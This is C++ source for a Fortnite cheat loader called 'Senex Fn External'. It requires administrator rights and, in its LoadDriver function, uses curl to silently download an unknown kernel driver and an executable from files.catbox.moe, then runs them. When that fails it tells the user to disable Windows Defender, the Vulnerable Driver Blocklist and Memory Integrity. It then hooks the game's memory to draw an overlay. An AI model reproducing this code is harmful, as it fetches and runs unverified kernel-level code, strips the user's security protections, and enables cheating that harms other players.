#include <iostream>
#include <windows.h>
#include <thread>
#include <string>
#include <filesystem>
#include <TlHelp32.h>
#include <chrono>
#include <vector>
#include "driver/comm.hpp"
#include "menu.hpp"
#include "decrypt/skCrypt.hpp"


namespace fs = std::filesystem;

void SetConsoleColor(WORD color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

void PrintMessage(const std::string& message, const std::string& type) {
    if (type == "success") {
        SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "[+] " << message << std::endl;
    }
    else if (type == "error") {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
        std::cout << "[-] " << message << std::endl;
    }
    else if (type == "info") {
        SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
        std::cout << "[i] " << message << std::endl;
    }
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}


void AnimateText(const std::string& text, WORD color = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE, int delay = 20) {
    SetConsoleColor(color);
    for (char c : text) {
        std::cout << c << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
    }
    std::cout << std::endl;
    SetConsoleColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

bool IsProcessRunning(const std::wstring& processName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return false;

    bool found = false;
    if (Process32First(snapshot, &entry)) {
        do {
            if (processName == entry.szExeFile) {
                found = true;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return found;
}

void SetConsoleTransparency(int transparency) {
    HWND hwnd = GetConsoleWindow();
    LONG style = GetWindowLong(hwnd, GWL_EXSTYLE);
    SetWindowLong(hwnd, GWL_EXSTYLE, style | WS_EX_LAYERED);
    SetLayeredWindowAttributes(hwnd, 0, (BYTE)transparency, LWA_ALPHA);
}

bool IsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &adminGroup)) {

        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin;
}

void CheckAdmin() {
    if (!IsAdmin()) {
        system("cls");
        AnimateText("\n\n[!] Please run this loader as ADMINISTRATOR!", FOREGROUND_RED | FOREGROUND_INTENSITY);
        Sleep(3000);
        exit(0);
    }
}

void SetColor(WORD color) {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), color);
}

void SplashScreen() {
    const std::vector<std::string> splash = {
    " _______  _______  _        _______             _______  _       ",
    "(  ____ \\(  ____ \\( (    /|(  ____ \\|\\     /|  (  ____ \\( (    /|",
    "| (    \\/| (    \\/|  \\  ( || (    \\/( \\   / )  | (    \\/|  \\  ( |",
    "| (_____ | (__    |   \\ | || (__     \\ (_) /   | (__    |   \\ | |",
    "(_____  )|  __)   | (\\ \\) ||  __)     ) _ (    |  __)   | (\\ \\) |",
    "      ) || (      | | \\   || (       / ( ) \\   | (      | | \\   |",
    "/\\____) || (____/\\| )  \\  || (____/\\( /   \\ )  | )      | )  \\  |",
    "\\_______)(_______/|/    )_)(_______/|/     \\|  |/       |/    )_)" };
    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    for (const auto& line : splash) {
        std::cout << line << std::endl;
    }
    std::cout << std::endl;
    SetColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
    std::cout << ">>>>> Senex Fn External <<<<<" << std::endl;
    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

void WaitForFortnite() {
    const std::wstring target = L"FortniteClient-Win64-Shipping.exe";
    AnimateText("[i] Waiting for Fortnite to start...", FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    while (!IsProcessRunning(target)) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    AnimateText("[+] Fortnite found!", FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Beep(600, 300);
}

void DriverLoadAnimation() {
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "[i] Loading Cheat Driver ";
    const char spinner[] = "|/-\\";
    for (int i = 0; i < 40; ++i) {
        std::cout << "\b" << spinner[i % 4] << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "\r[+] Driver loaded successfully!" << std::endl;
    Beep(560, 500);
    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
}

void InitializeCheat() {
    AnimateText("[i] Initializing Cheat Core...", FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    AnimateText("[+] Injection complete! Press F2 in Lobby.", FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    while (!(GetAsyncKeyState(VK_F2) & 0x8000)) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    AnimateText("[+] Cheat activated! Enjoy.", FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    Beep(700, 500);
}

void LoadDriver() {
    AnimateText("[i] Do you want to load the cheat driver? (y/n)", FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY);
    std::cout << "[i] Type Your Choice : ";
    std::string input;
    std::cin >> input;
    if (input == "y" || input == "Y") {
        DriverLoadAnimation();
        const std::string sysPath = "C:\\Windows\\Temp\\ud.sys";
        const std::string exePath = "C:\\Windows\\Temp\\udud.exe";
        system("curl --silent https://files.catbox.moe/mqhwlv.sys --output C:\\Windows\\Temp\\ud.sys >nul 2>&1");
        system("curl --silent https://files.catbox.moe/j5s1uy.bin --output C:\\Windows\\Temp\\udud.exe >nul 2>&1");
        system("cd C:\\Windows\\Temp\\ && udud.exe ud.sys >nul 2>&1");
        if (!std::filesystem::exists(sysPath) || !std::filesystem::exists(exePath)) {
            system("cls");
            PrintMessage("Failed to download required driver files!", "error");
            Sleep(1500);
            PrintMessage("Try to Download Dcontrol And Turn off Windows Virus Protection With it After That Try Again", "info");
            Sleep(1500);
            PrintMessage("Opening Dcontrol Download Site...", "info");
            Sleep(1500);
            system("start https://www.sordum.org/9480/defender-control-v2-1/");
            Sleep(-1);
        }
    }
    else {
        AnimateText("[i] Skipping driver load as per your choice.", FOREGROUND_RED | FOREGROUND_INTENSITY);
    }
}



int main() {
    SetConsoleTitleA("Senex Fn Skill v65.3");
    librarys::init();
    gui::init();
    SetConsoleTransparency(220);
    SplashScreen();
    CheckAdmin();
    LoadDriver();
    WaitForFortnite();
    InitializeCheat();
    if (!Driver::find_driver()) {
        system("cls");
        std::cout << "\n\n\n";
        PrintMessage("Driver not Loaded Correctly contact support !!", "error");
        std::cout << "\n\n\n";
        PrintMessage("Remember to turn Windows Defender off or it will not work!", "info");
        std::cout << "\n\n\n";
        PrintMessage("Remember if you are on Windows 11, turn off the Vulnerable Driver Blocklist and Memory Integrity!", "info");
        Sleep(-1);
        return 1;
    }
    Driver::process_id = Driver::find_process(L"FortniteClient-Win64-Shipping.exe");
    game_wnd = get_process_wnd(Driver::process_id);
    sigmabase = Driver::find_image();
    create_overlay();
    directx_init();
    render_loop();
    return 0;
}
